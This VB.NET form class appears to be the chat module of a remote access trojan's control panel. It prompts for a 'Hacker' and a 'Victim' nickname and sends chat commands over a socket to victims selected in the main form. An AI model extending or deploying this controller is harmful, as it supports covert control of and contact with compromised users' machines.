Public Class Chat
    Public sock As Integer
    Public Hackername As String
    Public Victimename As String



    Private Sub chat_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Hackername = InputBox("Enter Your Nickname", "Hacker Name")
        Victimename = InputBox("Enter The Victim's Nickname", "Victim Name")
        Form1.s.Send(sock, "chat")
    End Sub
    Private Sub chat_FormClosing(sender As System.Object, e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "stopchat")
        Next
    End Sub

    Private Sub TextBox2_KeyDown(sender As System.Object, e As System.Windows.Forms.KeyEventArgs) Handles TextBox2.KeyDown
        Select Case e.KeyCode
            Case Keys.Enter
                If TextBox2.Text.Length > 0 Then
                    For Each x As ListViewItem In Form1.l1.SelectedItems
                        Form1.s.Send(sock, "chat" & "||" & Hackername & "||" & Victimename & "||" & TextBox2.Text)
                    Next
                    TextBox1.Text = TextBox1.Text & Environment.NewLine & Hackername & " said : " & TextBox2.Text & vbNewLine
                    TextBox2.Text = ""
                Else
                End If
        End Select
    End Sub
End Class